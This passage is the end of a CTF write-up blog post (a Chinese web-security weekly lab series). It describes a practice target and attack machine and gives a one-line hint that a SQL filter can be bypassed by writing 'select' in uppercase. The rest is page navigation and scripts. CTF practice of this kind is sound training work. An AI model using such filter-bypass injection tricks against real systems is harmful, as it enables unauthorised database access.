+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5022</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>页面与上一题相同，select大写绕过即可。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-02-04</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/" data-title="合天网安Weekly系列（9-22）" data-hashtags="Web安全,CTF"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/" data-hashtag="Web安全"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/" data-title="合天网安Weekly系列（9-22）"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/" data-title="合天网安Weekly系列（9-22）"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/" data-title="合天网安Weekly系列（9-22）"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a>,&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" class="prev" rel="prev" title="合天网安Weekly系列（1-8）"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>合天网安Weekly系列（1-8）</a>
+            <a href="/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/" class="next" rel="next" title="NepNep Winter-CAMP（Misc合集）">NepNep Winter-CAMP（Misc合集）<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
